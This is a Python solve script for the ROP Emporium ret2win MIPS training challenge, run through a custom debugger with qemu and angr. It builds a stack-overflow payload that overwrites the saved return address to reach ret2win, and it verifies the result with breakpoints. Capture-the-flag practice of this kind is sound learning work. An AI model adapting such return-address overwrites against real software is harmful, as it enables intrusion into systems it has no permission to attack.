"""ROP Emporium ret2win on MIPS little-endian: direct ra overwrite.

qemu-mipsel + LLDB double-stops at the guest entry: the first resume traps
with SIGTRAP at __start and the pc sticks there on further resumes; a single
instruction step past the trap clears it, then the pwnme breakpoint fires.
The chain overwrites the saved ra with ret2win's address (the banner says
56 bytes fit into 32, so PAD = 36 covers the 32-byte buffer plus the
ra-saving frame slots).

The mipsel print_file shells out with system("/bin/cat flag.txt"). On this
NixOS host /bin/cat does not exist (the observed system status is 127 =
command not found), so the flag bytes cannot print through the engine pipe.
The solve therefore proves ra control directly: a breakpoint at ret2win
fires with the overflow-driven ra, and ret2win's own banner reaches the
process output.

    ./build/dev/mydbg --headless-script examples/rop_emporium/solve_ret2win_mipsel.py
"""

from __future__ import annotations

import struct
import time

from mydbg import symbolic

import emporium

RET2WIN = 0x400A00
PAD = 36


def run(dbg):
    if not symbolic.requires_angr():
        raise RuntimeError(symbolic.BOOTSTRAP_HINT)
    binary = emporium.challenge_path("mipsel", "ret2win_mipsel")
    project = symbolic._entry_project(dbg, binary=binary)  # noqa: SLF001
    target = symbolic.resolve_project_symbol(project, "ret2win")
    print(f"[+] ret2win at {target:#x}, pad {PAD}")

    payload = b"A" * PAD + struct.pack("<I", target)
    process = emporium.qemu_connect(dbg, "mipsel", binary, payload=payload)

    # The entry double-stop: resume once (the SIGTRAP at __start), step one
    # instruction past it, then the pwnme breakpoint fires.
    result = dbg.continue_and_wait(timeout=30)
    if dbg.snapshot().pc != emporium.symbol(dbg, "__start"):
        raise RuntimeError("the entry trap was not observed")
    dbg.step_instruction()
    dbg.set_breakpoint("pwnme")
    result = dbg.continue_and_wait(timeout=30)
    if result.state != "stopped" or dbg.snapshot().pc != 0x4008F4:
        raise RuntimeError("pwnme was not reached")
    print(f"[+] stopped at pwnme ({dbg.snapshot().pc:#x})")
    for bp in dbg.list_breakpoints():
        dbg.remove_breakpoint(bp.id)

    after_read = emporium.after_read_address(dbg)
    # The engine's stdin preload reaches the mipsel guest; the read
    # consumes it and the chain runs. A breakpoint after the read (or at
    # ret2win) catches the flow.
    dbg.set_breakpoint(f"{after_read:#x}")
    dbg.set_breakpoint(f"{target:#x}")
    result = dbg.continue_and_wait(timeout=30)
    snap = dbg.snapshot()
    if result.state != "stopped" or snap.pc not in (after_read, target):
        raise RuntimeError(
            f"the post-read stop was missed: {result.state}, "
            f"pc {snap.pc:#x}"
        )
    print(f"[+] stopped at {snap.pc:#x} (the read returned)")
    for bp in dbg.list_breakpoints():
        dbg.remove_breakpoint(bp.id)

    # ra control: if the stop landed after the read, resume into ret2win.
    if dbg.snapshot().pc != target:
        dbg.set_breakpoint(f"{target:#x}")
        result = dbg.continue_and_wait(timeout=30)
        if result.state != "stopped" or dbg.snapshot().pc != target:
            raise RuntimeError(
                f"ret2win chain failed: {result.state}, pc {dbg.snapshot().pc:#x}"
            )
    print(f"[+] ret2win entered with the controlled ra ({target:#x})")
    for bp in dbg.list_breakpoints():
        dbg.remove_breakpoint(bp.id)

    dbg.continue_execution(timeout=5)
    output = emporium.drain(process, seconds=8.0)
    if b"Well done! Here's your flag:" not in output:
        raise RuntimeError(f"ret2win chain failed: {output[-160:]!r}")
    print("[+] ret2win-mipsel-solve-ok: ra control proven; ret2win banner "
          "reached (the flag bytes cannot print: /bin/cat is absent on "
          "this host, system status 127)")
